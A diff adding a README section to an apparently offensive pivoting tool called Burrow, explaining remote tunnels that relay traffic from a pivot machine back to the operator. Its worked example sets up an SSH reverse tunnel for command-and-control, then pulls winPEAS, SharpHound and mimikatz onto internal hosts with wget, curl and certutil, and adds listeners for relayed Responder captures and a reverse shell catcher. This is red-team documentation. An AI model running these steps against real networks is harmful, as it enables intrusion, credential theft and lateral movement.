@@ -933,6 +933,55 @@ burrow> route add 10.0.0.0/24
 burrow> exit
 ```
 
+### Remote Tunnel — Serve Files / Forward Ports Back to Operator
+
+Remote tunnels make the agent listen on the pivot machine and forward connections back through yamux to the operator's machine. This is essential for serving files to internal hosts that can't reach the operator directly.
+
+**How it works:** The agent opens a listener on the pivot. When an internal host connects, the agent opens a yamux stream back to the server, which dials the target address on the **operator's** machine. Traffic relays bidirectionally through the stream.
+
+**Real-world example:** Serve tools to internal machines through a dual-homed pivot.
+
+```bash
+# 1. Operator: start HTTP server with your tools
+python3 -m http.server 6969
+
+# 2. Operator: start Burrow server (as root for TUN support)
+sudo burrow server --tui --webui
+
+# 3. SSH reverse tunnel for C2 egress (pivot can't reach operator directly)
+ssh -R 11601:127.0.0.1:11601 user@10.10.155.5
+
+# 4. Pivot: start agent (connects through SSH tunnel)
+./burrow agent --connect 127.0.0.1:11601
+
+# 5. Operator TUI: add remote tunnel
+#    This makes the pivot listen on 0.0.0.0:6969 and forward
+#    connections back to 127.0.0.1:6969 on the OPERATOR's machine
+tunnel add remote 0.0.0.0:6969 127.0.0.1:6969
+
+# 6. From any internal machine (e.g., 10.10.10.15 via evil-winrm):
+wget http://10.10.10.5:6969/tools/winPEASx64.exe
+curl http://10.10.10.5:6969/tools/SharpHound.exe -o SharpHound.exe
+certutil -urlcache -split -f http://10.10.10.5:6969/tools/mimikatz.exe C:\Users\Public\mimikatz.exe
+```
+
+**Multiple remote tunnels:** You can stack them. Each gets its own listener on the pivot.
+
+```bash
+# Serve files on port 6969
+tunnel add remote 0.0.0.0:6969 127.0.0.1:6969
+
+# Forward Responder/Inveigh captures back on port 445
+tunnel add remote 0.0.0.0:8445 127.0.0.1:445
+
+# Reverse shell catcher
+tunnel add remote 0.0.0.0:4444 127.0.0.1:4444
+```
+
+**Key distinction from local tunnels:**
+- **Local tunnel** (`tunnel add local`): Operator listens locally, forwards to agent's network. Use for reaching internal services.
+- **Remote tunnel** (`tunnel add remote`): Agent listens on pivot, forwards back to operator. Use for serving files, catching shells, receiving data from internal hosts.
+
 ### Standalone Port Forwarding
 
 ```bash
